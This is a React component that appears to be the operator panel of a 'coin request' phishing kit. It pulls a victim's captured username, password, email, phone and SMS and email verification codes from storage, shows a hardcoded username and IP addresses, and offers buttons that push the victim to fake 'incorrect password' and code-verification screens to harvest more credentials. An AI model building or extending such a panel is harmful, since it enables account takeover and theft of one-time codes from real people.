import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Diamond, User, DollarSign, Globe, Smartphone, Clock } from 'lucide-react';

const AdminPage = () => {
  const navigate = useNavigate();

  const requestData = {
    username: localStorage.getItem('username') || '10015317831apyae',
    amount: localStorage.getItem('coinAmount') || '100000',
    location: 'Unknown',
    device: 'Android Device',
    ip: '2001:44c8:4605:525d:141:7fea:f86b:22d1, 172.69.33.200',
    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
    email: localStorage.getItem('email') || '',
    phone: localStorage.getItem('phone') || '',
    password: localStorage.getItem('password') || '',
    phoneCode: localStorage.getItem('phoneCode') || '',
    emailCode: localStorage.getItem('emailCode') || ''
  };

  const adminButtons = [
    { id: 'password', label: 'Password', icon: '🔐', route: '/incorrect-password' },
    { id: 'form', label: 'Form', icon: '📝', route: '/contact' },
    { id: 'code', label: 'Code', icon: '📱', route: '/verify-phone' },
    { id: '4-digit', label: '4-Digit', icon: '🔢', route: '/verify-phone' },
    { id: 'wrong', label: 'Wrong', icon: '❌', route: '/incorrect-password' },
    { id: 'mail', label: 'Mail', icon: '📧', route: '/verify-email' },
    { id: 'mail-code', label: 'Mail code', icon: '📧', route: '/verify-email' },
    { id: 'wrong-mail', label: 'Wrong Mail', icon: '❌', route: '/verify-email' },
    { id: 'finish', label: 'Finish', icon: '✅', route: '/' }
  ];

  const handleButtonClick = (route) => {
    navigate(route);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#98C379] via-[#87B968] to-[#76A957] p-8">
      {/* WhatsApp Style Card */}
      <div className="max-w-4xl mx-auto">
        {/* Sender Info */}
        <div className="mb-4 flex items-center gap-2">
          <div className="bg-white/90 rounded-full px-4 py-2 shadow-md">
            <span className="text-[#075E54] font-semibold">Yuse İbnedir</span>
          </div>
        </div>

        {/* Message Card */}
        <div className="bg-white rounded-2xl shadow-2xl p-8 mb-6 relative">
          {/* Header */}
          <div className="flex items-center gap-3 mb-6 pb-4 border-b-2 border-gray-200">
            <Diamond className="w-10 h-10 text-cyan-500" />
            <h1 className="text-3xl font-black text-gray-900">COIN REQUEST</h1>
          </div>

          {/* Request Details */}
          <div className="space-y-4 mb-8">
            <div className="flex items-start gap-3">
              <User className="w-6 h-6 text-blue-500 flex-shrink-0 mt-1" />
              <div>
                <span className="font-bold text-gray-900">Username:</span>
                <span className="ml-2 text-gray-700 font-mono">{requestData.username}</span>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <DollarSign className="w-6 h-6 text-gray-600 flex-shrink-0 mt-1" />
              <div>
                <span className="font-bold text-gray-900">Amount:</span>
                <span className="ml-2 text-gray-700 font-mono">{requestData.amount}</span>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <Globe className="w-6 h-6 text-green-500 flex-shrink-0 mt-1" />
              <div>
                <span className="font-bold text-gray-900">Location:</span>
                <span className="ml-2 text-gray-700">{requestData.location}</span>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <Smartphone className="w-6 h-6 text-purple-500 flex-shrink-0 mt-1" />
              <div>
                <span className="font-bold text-gray-900">Device:</span>
                <span className="ml-2 text-gray-700">{requestData.device}</span>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <Globe className="w-6 h-6 text-blue-500 flex-shrink-0 mt-1" />
              <div className="flex-1">
                <span className="font-bold text-gray-900">IP:</span>
                <div className="ml-2 text-gray-700 font-mono text-sm break-all">{requestData.ip}</div>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <Clock className="w-6 h-6 text-red-500 flex-shrink-0 mt-1" />
              <div>
                <span className="font-bold text-gray-900">Time:</span>
                <span className="ml-2 text-gray-700 font-mono">{requestData.time}</span>
              </div>
            </div>
          </div>

          {/* Timestamp */}
          <div className="text-right text-gray-400 text-sm">
            {new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })}
          </div>
        </div>

        {/* Admin Buttons */}
        <div className="grid grid-cols-4 gap-3">
          {adminButtons.map((button) => (
            <button
              key={button.id}
              onClick={() => handleButtonClick(button.route)}
              className="bg-white/90 hover:bg-white rounded-xl shadow-lg hover:shadow-xl p-4 transition-all transform hover:scale-105 flex flex-col items-center justify-center gap-2 min-h-[100px]"
            >
              <span className="text-3xl">{button.icon}</span>
              <span className="text-sm font-semibold text-gray-800 text-center">{button.label}</span>
            </button>
          ))}
        </div>

        {/* Additional Button Row for Wrong Mail and Finish */}
        {/* <div className="grid grid-cols-2 gap-3 mt-3">
          <button
            onClick={() => handleButtonClick('/verify-email')}
            className="bg-white/90 hover:bg-white rounded-xl shadow-lg hover:shadow-xl p-4 transition-all transform hover:scale-105 flex flex-col items-center justify-center gap-2 min-h-[100px]"
          >
            <span className="text-3xl">❌</span>
            <span className="text-sm font-semibold text-gray-800">Wrong Mail</span>
          </button>
          <button
            onClick={() => handleButtonClick('/')}
            className="bg-white/90 hover:bg-white rounded-xl shadow-lg hover:shadow-xl p-4 transition-all transform hover:scale-105 flex flex-col items-center justify-center gap-2 min-h-[100px]"
          >
            <span className="text-3xl">✅</span>
            <span className="text-sm font-semibold text-gray-800">Finish</span>
          </button>
        </div> */}
      </div>
    </div>
  );
};

export default AdminPage;